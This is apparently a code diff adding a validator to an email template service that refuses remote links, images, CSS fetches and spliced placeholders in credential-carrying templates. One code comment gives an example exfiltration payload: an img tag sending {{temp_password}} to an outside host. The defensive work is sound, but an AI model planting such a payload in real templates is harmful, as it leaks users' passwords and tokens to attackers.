@@ -7,7 +7,9 @@ Manages CRUD operations for email templates and renders them with context variab
 import re
 import uuid
 from datetime import datetime, time, timedelta, timezone
+from html.parser import HTMLParser
 from typing import Any, Callable, Dict, List, Optional, Tuple
+from urllib.parse import urlsplit
 
 from loguru import logger
 from sqlalchemy import and_, func, select
@@ -3952,6 +3954,122 @@ def is_always_sent(template_type: Any) -> bool:
         return False
 
 
+# Attributes whose value a mail client fetches or follows. A credential
+# template that loads or links anything outside the department's own app is
+# how a rewritten body carries a temporary password or a reset token off-site:
+# `<img src="https://elsewhere/?p={{temp_password}}">` reports it the moment the
+# email is opened, from the department's own sender.
+_URL_ATTRIBUTES = frozenset(
+    {
+        "href",
+        "src",
+        "srcset",
+        "background",
+        "action",
+        "formaction",
+        "poster",
+        "data",
+        "xlink:href",
+        "cite",
+        "longdesc",
+        "lowsrc",
+        "dynsrc",
+        "ping",
+    }
+)
+_LONE_PLACEHOLDER = re.compile(r"^\s*\{\{\s*\w+\s*\}\}\s*$")
+_CSS_URL = re.compile(r"url\s*\(\s*['\"]?([^'\")]*)", re.IGNORECASE)
+_CSS_IMPORT = re.compile(r"@import", re.IGNORECASE)
+
+
+def _own_hosts() -> frozenset:
+    host = urlsplit(app_settings.FRONTEND_URL or "").hostname
+    return frozenset({host.lower()}) if host else frozenset()
+
+
+def _link_is_allowed(value: str, own_hosts: frozenset) -> bool:
+    value = value.strip()
+    if not value or value.startswith("#") or _LONE_PLACEHOLDER.match(value):
+        return True
+    # A placeholder spliced into any larger URL is the exfiltration shape,
+    # whichever host it points at: only a placeholder standing alone (the
+    # shipped defaults' `href="{{reset_url}}"`) is a link the system built.
+    if "{{" in value:
+        return False
+    lowered = value.lower()
+    if lowered.startswith(("mailto:", "tel:")):
+        return True
+    parts = urlsplit(value)
+    if parts.scheme in ("http", "https") and parts.hostname:
+        return parts.hostname.lower() in own_hosts
+    return False
+
+
+class _LinkCollector(HTMLParser):
+    def __init__(self) -> None:
+        super().__init__(convert_charrefs=True)
+        self.links: List[str] = []
+        self.css: List[str] = []
+        self._in_style = False
+
+    def handle_starttag(self, tag: str, attrs: List[Tuple[str, Optional[str]]]):
+        self._in_style = tag == "style"
+        for name, value in attrs:
+            if value is None:
+                continue
+            if name in _URL_ATTRIBUTES:
+                if name == "srcset":
+                    # "url 2x, url 3x": every candidate's URL is a fetch.
+                    self.links.extend(
+                        entry.split()[0] for entry in value.split(",") if entry.split()
+                    )
+                elif name == "ping":
+                    # A space-separated list of URLs, each pinged on click.
+                    self.links.extend(value.split())
+                else:
+                    self.links.append(value)
+            elif name == "style":
+                self.css.append(value)
+
+    def handle_endtag(self, tag: str) -> None:
+        if tag == "style":
+            self._in_style = False
+
+    def handle_data(self, data: str) -> None:
+        if self._in_style:
+            self.css.append(data)
+
+
+def protected_template_link_problems(html_body: Optional[str]) -> List[str]:
+    """Links and fetches in a credential template's HTML that are refused.
+
+    Applies to ``ALWAYS_SENT_TYPES`` only: those carry a temporary password, a
+    reset or ballot token, or an applicant's private link. Allowed: a lone
+    placeholder (``{{reset_url}}``), a link to the app's own host
+    (``FRONTEND_URL``), ``mailto:``/``tel:`` and in-page anchors. Everything
+    else — a remote image, a stylesheet, a link to another site, a placeholder
+    inside a larger URL — is returned so the save can be refused with the
+    reason, rather than silently stripped and saved as something the editor
+    did not write.
+    """
+    if not html_body:
+        return []
+    collector = _LinkCollector()
+    collector.feed(html_body)
+    collector.close()
+    own_hosts = _own_hosts()
+    problems = [
+        link for link in collector.links if not _link_is_allowed(link, own_hosts)
+    ]
+    for css in collector.css:
+        if _CSS_IMPORT.search(css):
+            problems.append("@import")
+        problems.extend(
+            url for url in _CSS_URL.findall(css) if not _link_is_allowed(url, own_hosts)
+        )
+    return problems
+
+
 class EmailTemplateService:
     """Service for managing and rendering email templates"""
 
@@ -4199,6 +4317,15 @@ class EmailTemplateService:
                 "This email cannot be switched off: its recipient has no "
                 "other way to receive what it carries"
             )
+        if "html_body" in fields and is_always_sent(template.template_type):
+            refused = protected_template_link_problems(fields["html_body"])
+            if refused:
+                raise ValueError(
+                    "This email carries a password, token or private link, so it "
+                    "may only link to this system's own address, a placeholder "
+                    "on its own, mailto: or tel:. Remove: "
+                    + ", ".join(sorted(set(refused))[:5])
+                )
 
         # An allowlist, not a skip list: `fields` arrives as **kwargs, so a
         # caller could otherwise name `id` or `organization_id` and move a
